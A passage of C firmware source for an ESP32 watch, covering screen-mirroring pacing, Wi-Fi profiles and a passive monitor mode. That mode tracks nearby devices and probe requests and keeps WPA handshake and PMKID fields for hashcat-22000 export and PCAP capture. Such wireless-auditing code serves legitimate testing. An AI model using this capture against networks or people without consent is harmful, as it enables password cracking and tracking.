/* Encoder pacing. The JPEG encode is PSRAM-bound and the two cores share one cache: back-to-back encodes
 * on core 0 starve the LVGL render on core 1 (the owner saw the WATCH lag while mirrored). The spacing
 * between encodes follows the LVGL lag gauge: the moment LVGL's 50 ms timer runs late, the spacing grows;
 * when the watch is comfortable again it shrinks back. Never faster than MIR_INTERVAL_MIN_US. */
#define MIR_INTERVAL_MIN_US   33000                       /* 30 fps ceiling (also the bridge fps cap's maximum); was 100 ms
                                                              * while a JPEG frame cost ~190 ms — an NQ frame costs ~10 ms */
#define MIR_INTERVAL_DEF_US   160000                      /* starting point                                          */
#define MIR_INTERVAL_MAX_US   600000                      /* back-off floor (~1.7 fps) while the watch is busy       */
/* Pacer thresholds on the LVGL 50 ms timer's AVERAGE interval (bridge knobs `gw mirror hi=N lo=N`). It
 * used to pace on the 2 s window MAXIMUM against 100 ms, but the Home screen alone reaches a 110-150 ms
 * max with nobody watching (measured 2026-10-11), so the pacer sat on its 600 ms floor whatever the
 * mirror did. The average tracks what the wearer feels: ~55-80 ms idle depending on the screen. */
#define MIR_LVGL_LAG_HI_MS    130                         /* average this late = the watch is lagging → back off     */
#define MIR_LVGL_LAG_LO_MS    110                         /* comfortably on time → speed up                          */
/* 2026-10-12: raised from 110 / 90. A connected viewer lifts the Home screen's LVGL timer average from ~80 ms to
 * ~105-110 ms at ANY frame rate (1.7 fps JPEG measured 104, 9 fps NQ 108 — the cost is core-0 traffic + the shared
 * cache, not the capture count), so the old 110 ms back-off threshold throttled a healthy Home to ~7 fps for no
 * gain in watch smoothness. The pacer now only backs off when the watch is really struggling (scrolling lists). */
#define MIR_TASK_STACK     12288                          /* PSRAM stack (pure compute + sockets; no flash ops)      */
#define MIR_TASK_PRIO      (tskIDLE_PRIORITY + 3)         /* level with lora/gnss/nfc (3), below buttons/wifi/gateway (4). Build 10 ran at +2
                                                              * ("leftover CPU only") and measured ~2 fps / ~480 ms encodes: at +2 the encoder
                                                              * lost the core to every other worker. The per-round sleep (MIR_ROUND_SLEEP_MS)
                                                              * keeps IDLE0 fed at any level; `gw mirror prio=N` moves it live for A/B. */
#define MIR_PRIO_MIN       (tskIDLE_PRIORITY + 1)         /* bridge knob range (never idle-level, never above the radio workers) */
#define MIR_PRIO_MAX       (tskIDLE_PRIORITY + 4)
#define MIR_ROUND_SLEEP_MS 5                              /* mandatory block per round / per rect: core 0's idle task MUST run (task-wdt) */

typedef struct {
    uint8_t  *base, *data;      /* PSRAM; data = 16-aligned view (the JPEG encoder's requirement)         */
    int       off;              /* the message starts at data + off (an NQ header is placed after encoding) */
    int       len;              /* message bytes (all chunks + their headers); 0 = empty                   */
    uint32_t  seq;              /* frame number (0 = empty)                                                */
    uint32_t  from;             /* covers every change in frames (from, seq]; 0 = keyframe (whole screen) */
    uint32_t  tiles[NOCSIF_MIR_TROWS];   /* the tiles this frame paints (kept for the union on overwrite)  */
} mir_buf_t;

/* Per-client non-blocking send cursor (parallel to s_ws_fds). total == 0 → idle. All fields except the
 * send itself are touched under s_ws_mux (the httpd task adds/removes clients while this task sends). */
typedef struct {
    uint8_t        hdr[10];     /* WS frame header (2/4/10 B, unmasked: server → client)                   */
    size_t         hdr_len;
    const uint8_t *payload;     /* a frame buffer's data, or txt for a state frame                         */
    size_t         off, total;  /* bytes on the wire / hdr_len + payload length                            */
    int            buf;         /* frame buffer index being sent; -1 = a text (state) frame / idle         */
    uint32_t       buf_seq;     /* that frame's seq when the send began                                    */
    uint32_t       last_seq;    /* newest frame fully delivered to this client                             */
    bool           need_full;   /* must receive a keyframe next (just joined / could not apply a frame)    */
    int64_t        t_start, t_progress, t_state;   /* send began / last byte moved / last state frame      */
    uint32_t       gen;         /* slot generation: bumped on add/del so a stale pump never writes a reused slot */
    uint32_t       kbps;        /* this client's send-rate EMA (KB/s, picture frames)                      */
    uint8_t        txt[512];    /* the small state JSON (its own copy per client)                          */
} ws_tx_t;

static int                s_ws_fds[COMP_WS_MAX];         /* connected /ws client sockfds (0 = empty)        */
static ws_tx_t           *s_ws_tx;                       /* [COMP_WS_MAX], PSRAM, allocated with the httpd   */
static portMUX_TYPE       s_ws_mux = portMUX_INITIALIZER_UNLOCKED;   /* fd table + cursors + frame metadata */
static mir_buf_t         *s_mb;                          /* [MIR_BUFS] the two encoded frames (table + data PSRAM, from mir_start) */
static uint8_t           *s_jraw_base, *s_jraw;          /* PSRAM in buffer: 16-aligned RGB565 snapshot the encoder reads */
static int                s_jraw_cap;                    /* bytes s_jraw can hold (grown to the padded frame size) */
static jpeg_enc_handle_t  s_enc;                         /* encoder handle, reopened when dims / quality change */
static int                s_enc_w, s_enc_h, s_enc_q, s_enc_sub;   /* what s_enc was opened for              */
/* Encoder knobs (bridge `gw mirror sub=420|422 blk=0|1`). sub = chroma subsampling: 4:2:2 keeps colour edges a
 * little crisper, 4:2:0 encodes 25 % fewer DCT blocks (the UI is mostly grey text, whose luma stays full-res).
 * blk = stripe mode: the encoder is fed one MCU row at a time from a small stripe built straight from the live
 * frame, instead of a whole-rect snapshot (a 400 KB PSRAM write + read per keyframe). */
static int                s_mir_sub = JPEG_SUBSAMPLE_422;
static int                s_mir_blk;
/* Codec (bridge `gw mirror codec=0|1`): 1 = NQ lossless tiles (default since 2026-10-12), 0 = JPEG rectangles
 * built from the same changed-tile grid (A/B). nodelay = TCP_NODELAY on a new /ws socket (default on). */
static int                s_mir_codec = 1;
static int                s_mir_nodelay = 1;
static uint32_t          *s_mir_carry;                   /* [NOCSIF_MIR_TROWS] tiles a full frame buffer could not hold → the next frame (PSRAM) */
/* Write budget (bridge `gw mirror txb=N`): at most N bytes per client per round (~5 ms apart while a frame is
 * draining) instead of everything the socket takes. With the lean Wi-Fi set's 2 static TX buffers a whole frame
 * written at once reaches the driver as one burst of segments; trickling it bounds the burst. 0 = no budget. */
static int                s_mir_txb;
static int                s_txb_left[COMP_WS_MAX];
static uint8_t           *s_jblk_base, *s_jblk;          /* PSRAM stripe: one MCU row, 16-aligned           */
static int                s_jblk_cap;
static TaskHandle_t       s_mir_task;                    /* created with the first httpd, then resident     */
static SemaphoreHandle_t  s_mir_lock;                    /* a round in progress vs. httpd teardown          */
static volatile bool      s_mir_enabled;                 /* httpd up: the task may touch sockets            */
static volatile bool      s_mir_force_full;              /* next encode = keyframe (reset / encode failure) */
static volatile bool      s_mir_pending;                 /* work exists that should be moving bytes         */
static volatile bool      s_mir_sending;                 /* a client cursor is mid-frame (socket was full)  */
static uint32_t           s_mir_seq;                     /* frame counter (seq of the newest encode)        */
static int64_t            s_mir_progress_us;             /* last time bytes moved / a frame completed       */
static int64_t            s_mir_backoff_until_us;        /* after an encoder failure: no encode before this */
static int                s_mir_q = MIR_Q_MAX;           /* current JPEG quality (adaptive)                 */
static int64_t            s_mir_interval_us = MIR_INTERVAL_DEF_US;   /* current minimum spacing between encodes */
static int64_t            s_mir_last_enc_us, s_mir_pace_us;          /* last encode start / last pacing decision */
static int64_t            s_mir_last_arm_us;                         /* last capture request (the pacer's clock) */
static int                s_mir_fps_cap;                 /* bridge knob: >0 fixes the spacing to 1/fps     */
static int                s_mir_prio = MIR_TASK_PRIO;    /* bridge knob: the mirror task's live priority    */
static int                s_mir_q_fixed;                 /* bridge knob: >0 pins the quality                */
static volatile bool      s_mir_paused;                  /* bridge knob: no encoding                        */
static int                s_mir_lag_hi = MIR_LVGL_LAG_HI_MS;   /* bridge knob: pacer back-off threshold (avg ms) */
static int                s_mir_lag_lo = MIR_LVGL_LAG_LO_MS;   /* bridge knob: pacer speed-up threshold (avg ms) */
static int                s_mir_tos = 0xA0;              /* bridge knob: IP TOS for a new /ws socket (0 = none) */
#define MIR_FWD_BUSY_PPS   40                             /* forwarded packets/s that count as "the hotspot is busy"  */
static int                s_mir_fwd_floor_ms;            /* bridge knob: min encode spacing while busy (0 = off) */
static volatile uint32_t  s_mir_fwd_pps;                 /* last pacing second's forwarded packets              */
/* Idle floor: a Home screen animates by itself (rotating dials, twinkling stars: ~80 KB/s of 7 KB frames) even
 * when nobody touches anything, and on the hotspot every byte is airtime the radio shares with the phone's own
 * uplink. While no input (touch / button / launch / key — not the 150 ms keepalive) has arrived for
 * MIR_IDLE_HOLD_US, captures are spaced at least s_mir_idle_ms apart; the first input lifts the floor at once. */
#define MIR_IDLE_HOLD_US   (1500 * 1000)
static volatile int64_t   s_mir_input_us;                /* last phone input (the idle floor's clock)         */
static int                s_mir_idle_ms = 200;           /* bridge knob idle=MS: ambient capture spacing (0 = off) */
static int64_t            s_mir_q_changed_us, s_mir_adapt_us;
static nocsif_mirror_stats_t s_mir_st;                   /* published telemetry (plain scalars)             */

/* The spacing the pacer applies right now: the adaptive interval, raised to the idle floor while nobody drives. */
static int64_t mir_eff_interval_us(int64_t now)
{
    int64_t iv = s_mir_interval_us;
    if (s_mir_idle_ms > 0 && now - s_mir_input_us > MIR_IDLE_HOLD_US && iv < (int64_t)s_mir_idle_ms * 1000)
        iv = (int64_t)s_mir_idle_ms * 1000;
    return iv;
}
static uint32_t           s_mir_win_frames, s_mir_win_us, s_mir_win_max_us, s_mir_win_bytes, s_mir_win_area, s_mir_win_rects;
static int64_t            s_mir_win_t0;                  /* telemetry window start                          */

/* ---- passive parser state (M5-P3) ------------------------------------------------- *
 * The rx callback (WiFi task) is the single producer; a dedicated parser task is the single
 * consumer. An SPSC slot-ring (PSRAM) carries raw frame bytes across; the index handoff uses
 * release/acquire so a filled slot is visible before its publish. The nearby-AP table is
 * written by the parser and read by the LVGL task under a short spinlock. */
typedef struct {
    int64_t  ts_us;                 /* capture time, from esp_timer_get_time */
    int8_t   rssi;
    uint8_t  channel;               /* rx channel (1..13) */
    uint8_t  pkt_type;              /* a wifi_promiscuous_pkt_type_t value */
    uint16_t orig_len;              /* the full frame length, including the FCS */
    uint16_t cap_len;              /* bytes actually copied, at most CAP_SNAP */
    uint8_t  data[CAP_SNAP];
} cap_slot_t;

static cap_slot_t       *s_ring;                 /* in PSRAM, CAP_SLOTS entries, allocated lazily */
static volatile uint32_t s_ring_head;            /* the consumer index, owned by the parser */
static volatile uint32_t s_ring_tail;            /* the producer index, owned by the rx callback */
static volatile uint32_t s_ring_drop;            /* frames dropped because the ring was full */
static volatile bool     s_parse_active;         /* frames the rx callback copied in and the parser decoded */
static TaskHandle_t      s_parse_task;

static void parse_wep(const cap_slot_t *s, const uint8_t *d);   /* #4 WEP data-frame consumer */

/* Nearby-AP table (parser writes, LVGL reads; guarded by s_ap_mux). */
typedef struct {
    bool     used;
    uint8_t  bssid[6];
    char     ssid[WIFI_SSID_MAX];   /* "" means hidden */
    uint8_t  channel;
    int8_t   rssi;
    uint8_t  sec;                   /* a nocsif_wifi_sec_t value */
    uint16_t frames;
    int64_t  last_us;
    char     vendor[12];
} mon_ap_t;

/* RAM: the passive identity tables live in PSRAM (allocated in do_parse_on, held for the session).
 * They are written only by the parser task and read by the LVGL getters, always under s_ap_mux — never
 * an ISR (the promiscuous rx-cb copies into the PSRAM SPSC ring; the parser task decodes into these) and
 * never with the flash cache disabled — so external RAM is safe and they no longer sit in the scarce
 * internal-DMA pool (docs/RAM-BUDGET.md Region 2 ~16.8 KB; [[project-ram-phase-a]]). */
static mon_ap_t         *s_mon_ap;       /* [MON_AP_MAX] in PSRAM; NULL until do_parse_on */
static int               s_mon_ap_cnt;
static volatile uint32_t s_mon_ap_gen;           /* bumps on an insert or eviction, i.e. a structural change */
static portMUX_TYPE      s_ap_mux = portMUX_INITIALIZER_UNLOCKED;

/* Station table (M5-P3.2): a client device seen in a data frame, mapped
 * to its AP. The parser writes it and the LVGL task reads it, sharing
 * s_ap_mux since both use short critical sections with low contention. */
typedef struct {
    bool     used;
    uint8_t  mac[6];
    uint8_t  bssid[6];              /* the AP this station is talking to; all-zero if none */
    uint8_t  channel;
    int8_t   rssi;
    uint16_t frames;
    int64_t  last_us;
    char     vendor[12];
} mon_sta_t;
static mon_sta_t        *s_mon_sta;      /* [MON_STA_MAX] in PSRAM (do_parse_on); parser task, s_ap_mux */
static int               s_mon_sta_cnt;
static volatile uint32_t s_mon_sta_gen;

/* Probe-request table (M5-P3.2): a (device, requested-SSID) pair. */
typedef struct {
    bool     used;
    uint8_t  mac[6];
    char     ssid[WIFI_SSID_MAX];   /* "" means a broadcast/wildcard probe */
    int8_t   rssi;
    uint16_t count;
    int64_t  last_us;
    char     vendor[12];
    uint8_t  channel;               /* rx channel last seen on (channel-lock when hunting) */
} mon_probe_t;
static mon_probe_t      *s_mon_probe;    /* [MON_PROBE_MAX] in PSRAM (do_parse_on); parser task, s_ap_mux */
static int               s_mon_probe_cnt;
static volatile uint32_t s_mon_probe_gen;

/* Raw beacon/probe-response IE bytes per AP, kept in PSRAM (parallel to s_mon_ap, same index) instead of
 * inline — the device-detail decoder is the only reader, so keeping ~220 B/AP off the scarce internal-DMA
 * pool preserves the headroom the radios + IMU FIFO drain need ([[project-usb-fileshare-imu-crash]]).
 * Written/read under s_ap_mux. */
#define MON_AP_IE_MAX (CAP_SNAP - 36)    /* IE region = after the 24-B MAC hdr + 12-B fixed params */
typedef struct { uint8_t data[MON_AP_IE_MAX]; uint16_t len; } mon_ap_ie_t;
static mon_ap_ie_t      *s_mon_ap_ie;    /* [MON_AP_MAX] in PSRAM; NULL until allocated */

/* ---- omit list (persisted; MACs dropped at ingestion into the passive tables) ---------------- *
 * Loaded ONCE before parsing starts (no reader race). Read under s_omit_mux by omit_contains on the
 * parser task; mutated + persisted only from the LVGL task (sole writer), so omit_save reads unlocked. */
static nocsif_wifi_omit_t s_omit[NOCSIF_WIFI_OMIT_MAX];
static volatile int       s_omit_cnt;
static bool               s_omit_loaded;
static portMUX_TYPE       s_omit_mux = portMUX_INITIALIZER_UNLOCKED;
static void               omit_load(void);   /* fwd */

/* Key-exchange table (M5-P4·1): one BSSID's observed EAPOL 4-way progress + any advertised PMKID.
 * Parser writes, LVGL reads; shares s_ap_mux. The M5 "hc22000 export" (passive polish) also retains
 * the client MAC + the fields a hashcat-22000 line needs: the ANonce from message 1, and the MIC +
 * the raw EAPOL bytes from message 2. */
#define HS_EAPOL_MAX 160               /* captured M2 EAPOL frame bytes (header + key frame)  */
typedef struct {
    bool     used;
    uint8_t  bssid[6];
    uint8_t  sta[6];                /* the client involved in the exchange */
    bool     have_sta;
    uint8_t  msg_mask;              /* which messages of the 4-way exchange were seen: bit0=msg1 through bit3=msg4 */
    bool     has_pmkid;
    uint8_t  pmkid[16];
    bool     have_anonce;
    uint8_t  anonce[32];           /* taken from message 1: the AP's nonce */
    bool     have_mic;
    uint8_t  mic[16];              /* taken from message 2 */
    uint8_t  eapol[HS_EAPOL_MAX];  /* the message-2 EAPOL frame, with its MIC field zeroed */
    uint8_t  eapol_len;
    int8_t   rssi;
    uint16_t frames;                /* EAPOL frames seen for this BSSID */
    int64_t  last_us;
    char     vendor[12];
} mon_hs_t;
static mon_hs_t         *s_mon_hs;       /* [MON_HS_MAX] in PSRAM (do_parse_on); parser task, s_ap_mux */
static int               s_mon_hs_cnt;
static volatile uint32_t s_mon_hs_gen;

/* PCAP capture (M5-P3.3): a separate all-frames SPSC ring, with the rx
 * callback as producer, drained by a dedicated big-stack writer task that
 * owns the FILE*. Kept independent of the parser ring so PCAP's snaplen and
 * rate never perturb the identity tables. */
typedef struct {
    int64_t  ts_us;
    int8_t   rssi;
    uint8_t  channel;
    uint16_t orig_len;              /* the full on-air frame length, before snaplen truncation */
    uint16_t cap_len;              /* bytes actually copied, at most PCAP_SNAP */
    uint8_t  data[PCAP_SNAP];
} pcap_slot_t;

static pcap_slot_t      *s_pcap_ring;             /* in PSRAM, PCAP_SLOTS entries, allocated lazily */
static volatile uint32_t s_pcap_head;             /* the consumer index, owned by the writer task */
static volatile uint32_t s_pcap_tail;             /* the producer index, owned by the rx callback */
static volatile uint32_t s_pcap_drop;             /* frames dropped because the ring was full */
static volatile bool     s_pcap_active;           /* frames the rx callback copied in and the writer drained */
static volatile bool     s_pcap_want;             /* the requested on/off state; the writer owns closing the file */
static volatile bool     s_pcap_idle = true;      /* whether the writer is parked with no open file, meaning it's safe to delete */
static TaskHandle_t      s_pcap_task;
static volatile uint32_t s_pcap_frames;           /* frames written this session */
static volatile uint32_t s_pcap_bytes;            /* bytes written, including headers */
static char              s_pcap_path[64];         /* the current or last file path, written by the writer and read by the LVGL task */
typedef enum { PCAP_OFF = 0, PCAP_REC, PCAP_NOSD, PCAP_FILESHARE, PCAP_ERR,
               PCAP_STREAM,                       /* M5-P5+ live streaming to USB-CDC */
               PCAP_NOHOST } pcap_state_t;         /* M5-P5+ armed for CDC, waiting for a host to connect */
static volatile int      s_pcap_state = PCAP_OFF;

/* Live-PCAP sink (M5-P5+): the shared writer drains to either an SD
 * file (SD, the P3.3 recorder) or the USB CDC serial port as a live stream
 * (CDC) that a host reads in real time via the bundled extcap plugin for
 * Wireshark. Only one sink is active at a time — both share the single ring
 * and writer task. */
typedef enum { PCAP_SINK_SD = 0, PCAP_SINK_CDC } pcap_sink_t;
static volatile int      s_pcap_sink = PCAP_SINK_SD;

/* PCAP capture filter (M5-P4.1): FULL writes every captured frame,
 * matching the original P3.3 behavior; EAPOL writes only EAPOL data frames
 * plus the beacon/probe-response that names the network, into hs-NNN.pcap.
 * Set before arming the shared writer; both the rx copy-out and the
 * filename prefix read it. */
typedef enum { PCAP_FILTER_FULL = 0, PCAP_FILTER_EAPOL } pcap_filter_t;
static volatile int      s_pcap_filter = PCAP_FILTER_FULL;

static void parse_frame(const cap_slot_t *s);  /* decodes one captured frame into the AP/station/probe tables */
static void pcap_stop_and_free(void);          /* stops PCAP capture and reclaims the writer task's stack */

/* ---- getters ---- */
bool        nocsif_wifi_available(void)   { return s_available; }
bool        nocsif_wifi_enabled(void)     { return s_enabled; }
bool        nocsif_wifi_connected(void)   { return s_connected; }
bool        nocsif_wifi_scanning(void)    { return s_scanning; }
nocsif_wifi_join_state_t nocsif_wifi_join_state(void) { return s_join_state; }
const char *nocsif_wifi_status_str(void)  { return s_status[s_status_i]; }
const char *nocsif_wifi_detail_str(void)  { return s_detail[s_detail_i]; }
const char *nocsif_wifi_ip_str(void)      { return s_ip[s_ip_i]; }
const char *nocsif_wifi_netmask_str(void) { return s_netmask[s_netmask_i]; }
const char *nocsif_wifi_gateway_str(void) { return s_gw[s_gw_i]; }
const char *nocsif_wifi_mac_str(void)     { return s_mac[s_mac_i]; }
const char *nocsif_wifi_saved_ssid(void)  { return s_ssid; }
bool        nocsif_wifi_autojoin(void)    { return s_autojoin; }
bool        nocsif_wifi_user_dropped(void) { return s_user_dropped; }
uint32_t    nocsif_wifi_scan_gen(void)    { return s_scan_gen; }
int         nocsif_wifi_ap_count(void)    { return s_ap_cnt[s_ap_i]; }

bool nocsif_wifi_ap_get(int idx, nocsif_wifi_ap_t *out)
{
    int i = s_ap_i;                       /* sample once, so the buffer and its count agree */
    if (out == NULL || idx < 0 || idx >= s_ap_cnt[i]) {
        return false;
    }
    *out = s_ap[i][idx];
    return true;
}

bool nocsif_wifi_authmode_open(uint8_t authmode)
{
    return (wifi_auth_mode_t)authmode == WIFI_AUTH_OPEN;
}

const char *nocsif_wifi_authmode_str(uint8_t authmode)
{
    switch ((wifi_auth_mode_t)authmode) {
        case WIFI_AUTH_OPEN:            return "open";
        case WIFI_AUTH_WEP:             return "WEP";
        case WIFI_AUTH_WPA_PSK:         return "WPA";
        case WIFI_AUTH_WPA2_PSK:        return "WPA2";
        case WIFI_AUTH_WPA_WPA2_PSK:    return "WPA2";
        case WIFI_AUTH_WPA2_ENTERPRISE: return "WPA2-E";
        case WIFI_AUTH_WPA3_PSK:        return "WPA3";
        case WIFI_AUTH_WPA2_WPA3_PSK:   return "WPA3";
        case WIFI_AUTH_WAPI_PSK:        return "WAPI";
        default:                        return "secured";
    }
}

/* ---- saved-profile getters: RAM-cached, safe on the LVGL task ---- */
int nocsif_wifi_saved_count(void) { return s_sv_cnt; }

/* ---- section 4.6 Governor P3 places, keyed by BSSID; plain reads are LVGL/timer-safe ---- */
int nocsif_wifi_saved_index(const char *ssid)
{
    if (ssid == NULL || ssid[0] == '\0') return -1;
    for (int i = 0; i < s_sv_cnt; i++) {
        if (strcmp(s_sv_ssid[i], ssid) == 0) return i;
    }
    return -1;
}

int nocsif_wifi_place_count(void) { return s_pl_cnt; }

bool nocsif_wifi_place_get(int idx, int32_t *lat_ud, int32_t *lon_ud, char *ssid, size_t ssid_len)
{
    if (idx < 0 || idx >= s_pl_cnt) return false;
    if (lat_ud) *lat_ud = s_pl[idx].lat_ud;
    if (lon_ud) *lon_ud = s_pl[idx].lon_ud;
    if (ssid && ssid_len) snprintf(ssid, ssid_len, "%s", s_pl[idx].ssid);
    return true;
}

static int place_find_bssid(const uint8_t bssid[6])
{
    for (int i = 0; i < s_pl_cnt; i++) {
        if (memcmp(s_pl[i].bssid, bssid, 6) == 0) return i;
    }
    return -1;
}

/* The connected AP's BSSID; esp_wifi_sta_get_ap_info is thread-safe, roughly a round trip to the WiFi task. */
static bool connected_bssid(uint8_t out[6])
{
    if (!s_connected) return false;
    wifi_ap_record_t ap;
    if (esp_wifi_sta_get_ap_info(&ap) != ESP_OK) return false;
    memcpy(out, ap.bssid, 6);
    return true;
}

int nocsif_wifi_connected_place(void)
{
    uint8_t b[6];
    return connected_bssid(b) ? place_find_bssid(b) : -1;
}

static void persist_places(void)
{
    nocsif_settings_set_i32("pl_n", s_pl_cnt);
    for (int i = 0; i < s_pl_cnt; i++) {
        char k[12], v[13];
        const uint8_t *b = s_pl[i].bssid;
        snprintf(v, sizeof v, "%02x%02x%02x%02x%02x%02x", b[0], b[1], b[2], b[3], b[4], b[5]);
        snprintf(k, sizeof k, "pl_b%d", i);  nocsif_settings_set_str(k, v);
        snprintf(k, sizeof k, "pl_s%d", i);  nocsif_settings_set_str(k, s_pl[i].ssid);
        snprintf(k, sizeof k, "pl_la%d", i); nocsif_settings_set_i32(k, s_pl[i].lat_ud);
        snprintf(k, sizeof k, "pl_lo%d", i); nocsif_settings_set_i32(k, s_pl[i].lon_ud);
    }
}

static void load_places(void)
{
    s_pl_cnt = nocsif_settings_get_i32("pl_n", 0);
    if (s_pl_cnt < 0) s_pl_cnt = 0;
    if (s_pl_cnt > WIFI_MAX_PLACES) s_pl_cnt = WIFI_MAX_PLACES;
    for (int i = 0; i < s_pl_cnt; i++) {
        char k[12], v[16] = "";
        snprintf(k, sizeof k, "pl_b%d", i);  nocsif_settings_get_str(k, v, sizeof v, "");
        unsigned b[6] = {0};
        if (sscanf(v, "%2x%2x%2x%2x%2x%2x", &b[0], &b[1], &b[2], &b[3], &b[4], &b[5]) == 6) {
            for (int j = 0; j < 6; j++) s_pl[i].bssid[j] = (uint8_t)b[j];
        }
        snprintf(k, sizeof k, "pl_s%d", i);  nocsif_settings_get_str(k, s_pl[i].ssid, sizeof s_pl[i].ssid, "");
        snprintf(k, sizeof k, "pl_la%d", i); s_pl[i].lat_ud = nocsif_settings_get_i32(k, 0);
        snprintf(k, sizeof k, "pl_lo%d", i); s_pl[i].lon_ud = nocsif_settings_get_i32(k, 0);
    }
    if (s_pl_cnt) ESP_LOGI(TAG, "places: %d learned", s_pl_cnt);
}

/* Forgetting a network also drops the places learned under its SSID. */
static void places_drop_ssid(const char *ssid)
{
    bool changed = false;
    for (int i = 0; i < s_pl_cnt; ) {
        if (strcmp(s_pl[i].ssid, ssid) == 0) {
            for (int j = i; j < s_pl_cnt - 1; j++) s_pl[j] = s_pl[j + 1];
            s_pl_cnt--;
            changed = true;
        } else {
            i++;
        }
    }
    if (changed) persist_places();
}

/* Worker-side only, since this is a pinned task and the NVS write
 * belongs here: stamps the currently connected AP as a place — a new BSSID
 * gets inserted (oldest evicted if full), while an already-known one only
 * moves if the fix is GEO_RESTAMP_M away from the stored location. */
static void do_geo_stamp(int32_t lat_ud, int32_t lon_ud)
{
    uint8_t b[6];
    if ((lat_ud == 0 && lon_ud == 0) || !connected_bssid(b)) return;
    int idx = place_find_bssid(b);
    if (idx >= 0) {
        double mlat = ((double)lat_ud + (double)s_pl[idx].lat_ud) * 0.5e-6 * (3.14159265358979 / 180.0);
        double dy = ((double)lat_ud - (double)s_pl[idx].lat_ud) * 1e-6 * 111320.0;
        double dx = ((double)lon_ud - (double)s_pl[idx].lon_ud) * 1e-6 * 111320.0 * cos(mlat);
        if (sqrt(dx * dx + dy * dy) < GEO_RESTAMP_M) return;              /* the same place as before: keep the existing stamp */
    } else {
        if (s_pl_cnt < WIFI_MAX_PLACES) {
            idx = s_pl_cnt++;
        } else {                                                           /* the table is full: evict the oldest entry */
            for (int j = 0; j < WIFI_MAX_PLACES - 1; j++) s_pl[j] = s_pl[j + 1];
            idx = WIFI_MAX_PLACES - 1;
        }
        memcpy(s_pl[idx].bssid, b, 6);
        snprintf(s_pl[idx].ssid, sizeof s_pl[idx].ssid, "%s", s_ssid);
    }
    s_pl[idx].lat_ud = lat_ud;
    s_pl[idx].lon_ud = lon_ud;
    persist_places();
    ESP_LOGI(TAG, "geo: place \"%s\" (%02x:%02x:%02x:%02x:%02x:%02x) learned @ %.5f, %.5f (%d/%d)",
             s_pl[idx].ssid, b[0], b[1], b[2], b[3], b[4], b[5], lat_ud / 1e6, lon_ud / 1e6, s_pl_cnt, WIFI_MAX_PLACES);
}

bool nocsif_wifi_saved_ssid_at(int idx, char *out, size_t len)
{
    if (out == NULL || idx < 0 || idx >= s_sv_cnt) {
        return false;
    }
    snprintf(out, len, "%s", s_sv_ssid[idx]);
    return true;
}

bool nocsif_wifi_is_saved(const char *ssid)
{
    if (ssid == NULL) {
        return false;
    }
    for (int i = 0; i < s_sv_cnt; i++) {
        if (strcmp(s_sv_ssid[i], ssid) == 0) {
            return true;
        }
    }
    return false;
}

const char *nocsif_wifi_pass_of(const char *ssid)
{
    if (ssid) {
        for (int i = 0; i < s_sv_cnt; i++) {
            if (strcmp(s_sv_ssid[i], ssid) == 0) {
                return s_sv_pass[i];
            }
        }
    }
    return "";
}

/* ---- string state helper ---- */
/* Recomputes the compact status and detail line from the current flags.
 * Called after every state transition, so the UI — which only ever reads
 * these strings — always reflects the actual current state. */
static void refresh_strings(void)
{
    if (!s_enabled && !s_scanning) {
        publish_status("off");
        publish_detail("WiFi off");
        return;
    }
    if (s_ap_active) {
        char line[80];
        int cli = s_ap_cli_cnt[s_ap_cli_i];
        snprintf(line, sizeof line, "AP \xC2\xB7 %s \xC2\xB7 %d client%s%s",
                 s_ap_ssid[0] ? s_ap_ssid : AP_SSID_DEF, cli, cli == 1 ? "" : "s",
                 s_portal_active ? " \xC2\xB7 portal" : "");
        publish_status(s_portal_active ? "portal" : "ap");
        publish_detail(line);
        return;
    }
    if (s_mon_active || s_pending_monitor) {
        char line[80];
        if (s_mon_hop) {
            snprintf(line, sizeof line, "Monitor \xC2\xB7 hopping 1-13");
        } else {
            snprintf(line, sizeof line, "Monitor \xC2\xB7 ch %d", s_mon_chan);
        }
        publish_status("mon");
        publish_detail(line);
        return;
    }
    if (s_scanning) {
        publish_status("scan");
        publish_detail("Scanning for networks...");   /* an ellipsis */
        return;
    }
    if (s_connected) {
        char tag[24], line[80];
        snprintf(tag, sizeof tag, "%.20s", s_ssid[0] ? s_ssid : "online");
        snprintf(line, sizeof line, "%s \xC2\xB7 %s", s_ssid[0] ? s_ssid : "online", s_ip[s_ip_i]);
        publish_status(tag);
        publish_detail(line);
        return;
    }
    if (s_auth_fail) {
        char line[80];
        snprintf(line, sizeof line, "Wrong password for %.32s", s_ssid);
        publish_status("err");
        publish_detail(line);
        return;
    }
    if (s_want_connect) {
        char line[80];
        snprintf(line, sizeof line, "Joining %.32s...", s_ssid);
        publish_status("join");
        publish_detail(line);
        return;
    }
    publish_status("on");
    publish_detail(s_ssid[0] ? "On \xC2\xB7 not connected" : "On \xC2\xB7 no saved network");
}

/* ---- credential persistence ---- */
static void load_creds(void)
{
    nocsif_settings_get_str(K_SSID, s_ssid, sizeof s_ssid, "");
    nocsif_settings_get_str(K_PASS, s_pass, sizeof s_pass, "");
    if (s_ssid[0]) {
        ESP_LOGI(TAG, "saved network: \"%s\"", s_ssid);
    }
}
static void persist_creds(void)
{
    nocsif_settings_set_str(K_SSID, s_ssid);
    nocsif_settings_set_str(K_PASS, s_pass);
    ESP_LOGI(TAG, "creds persisted for \"%s\"", s_ssid);
}

/* ---- saved network profiles: an SSID plus passphrase list ---- */
static void persist_saved(void)
{
    nocsif_settings_set_i32(K_SV_CNT, s_sv_cnt);
    for (int i = 0; i < s_sv_cnt; i++) {
        char k[12];
        snprintf(k, sizeof k, "wn_s%d", i); nocsif_settings_set_str(k, s_sv_ssid[i]);
        snprintf(k, sizeof k, "wn_p%d", i); nocsif_settings_set_str(k, s_sv_pass[i]);
    }
}

static void load_saved(void)
{
    s_sv_cnt = nocsif_settings_get_i32(K_SV_CNT, 0);
    if (s_sv_cnt < 0) s_sv_cnt = 0;
    if (s_sv_cnt > WIFI_MAX_SAVED) s_sv_cnt = WIFI_MAX_SAVED;
    for (int i = 0; i < s_sv_cnt; i++) {
        char k[12];
        snprintf(k, sizeof k, "wn_s%d", i); nocsif_settings_get_str(k, s_sv_ssid[i], sizeof s_sv_ssid[i], "");
        snprintf(k, sizeof k, "wn_p%d", i); nocsif_settings_get_str(k, s_sv_pass[i], sizeof s_sv_pass[i], "");
    }
    load_places();                                          /* section 4.6 P3: the BSSID-keyed places table */
    /* Migrates the legacy single-slot credential into the new list, so the current network survives the upgrade. */
    if (s_sv_cnt == 0 && s_ssid[0]) {
        snprintf(s_sv_ssid[0], sizeof s_sv_ssid[0], "%s", s_ssid);
        snprintf(s_sv_pass[0], sizeof s_sv_pass[0], "%s", s_pass);
        s_sv_cnt = 1;
